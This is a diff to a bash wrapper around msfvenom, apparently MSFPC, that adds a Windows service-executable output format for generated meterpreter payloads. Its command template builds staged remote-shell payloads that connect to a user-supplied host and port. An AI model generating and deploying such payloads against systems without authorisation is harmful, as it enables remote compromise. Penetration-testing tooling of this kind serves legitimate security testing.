@@ -87,7 +87,7 @@ function doAction {
   PORT="${3}"
   PAYLOAD="${4}"
   CMD="${5}"
-  FILEEXT="${6}"
+  FILEEXT="${6%-service}"
   SHELL="${7}"
   DIRECTION="${8}"
   STAGE="${9}"
@@ -197,7 +197,7 @@ function doHelp {
   echo -e "   + ${YELLOW}Powershell${RESET} [.${YELLOW}ps1${RESET}]"
   echo -e "   + ${YELLOW}Python${RESET} [.${YELLOW}py${RESET}]"
   echo -e "   + ${YELLOW}Tomcat${RESET} [.${YELLOW}war${RESET}]"
-  echo -e "   + ${YELLOW}Windows${RESET} [.${YELLOW}exe${RESET} // .${YELLOW}dll${RESET}]"
+  echo -e "   + ${YELLOW}Windows${RESET} [.${YELLOW}exe${RESET} // .${YELLOW}exe${RESET} // .${YELLOW}dll${RESET}]"
   echo ""
   echo -e " Rather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address."
   echo -e " Missing <DOMAIN/IP> will default to the IP menu."
@@ -297,7 +297,7 @@ fi
 
 ## Define TYPEs/FORMATs
 TYPEs=(  apk   asp  aspx  bash  java  linux    osx    perl  php  powershell python  tomcat  windows )   # Due to how its coded, this must always be a higher array count than ${FORMATs}
-FORMATs=(                 sh    jsp   lin elf  macho  pl         ps1        py      war     win exe dll )
+FORMATs=(                 sh    jsp   lin elf  macho  pl         ps1        py      war     win exe srv dll )
 
 
 ## Check user input
@@ -756,16 +756,17 @@ elif [[ "${TYPE}" == "tomcat" || "${TYPE}" == "war" ]]; then
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## Windows
-elif [[ "${TYPE}" == "windows" || "${TYPE}" == "win" || "${TYPE}" == "exe" || "${TYPE}" == "dll" ]]; then
+elif [[ "${TYPE}" == "windows" || "${TYPE}" == "win" || "${TYPE}" == "exe" || "${TYPE}" == "dll" || "${TYPE}" == "srv" ]]; then
   [[ -z "${SHELL}" ]] && SHELL="meterpreter"
   [[ -z "${STAGE}" ]] && STAGE="staged" && _STAGE="/"
   [[ "${METHOD}" == "find_port" ]] && METHOD="allports"
   # Its able todo anything that you throw at it =).
   FILEEXT="exe"
   [[ "${TYPE}" == "dll" ]] && FILEEXT="dll"
+  [[ "${TYPE}" == "srv" ]] && FILEEXT="exe-service"
   TYPE="windows"
   PAYLOAD="${TYPE}/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
-  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
+  CMD="msfvenom -p ${PAYLOAD} -f ${FILEEXT} \\\\\n  --platform ${TYPE} -a x86 -e generic/none ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT%-service}'"
   doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
 
 ## Batch/Loop modes
